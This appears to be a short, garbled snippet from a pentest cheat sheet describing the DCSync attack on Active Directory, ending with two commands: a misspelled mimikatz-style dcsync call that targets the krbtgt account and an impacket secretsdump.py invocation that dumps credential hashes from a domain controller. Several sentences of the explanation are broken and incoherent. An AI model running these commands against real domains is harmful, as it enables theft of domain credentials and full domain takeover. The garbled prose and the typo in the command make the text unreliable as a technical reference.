Active Directory environments typically include multiple domain controllers, which needs to sync it could be simply a backup server. some applications, including Azure Active Directory Connect, need replication permissions. In a DCSync attack, a hacker who has gained access to a privileged account with grant a service account “Replicate Directory Changes All” this AD functionality by pretending to be a DC. 

 
```sh
lsadumnp::dcsync /domain:<domain_name> /user:krbtgt

secretsdump.py <DOMAIN>/<User>:'<password>'@<IP>
```
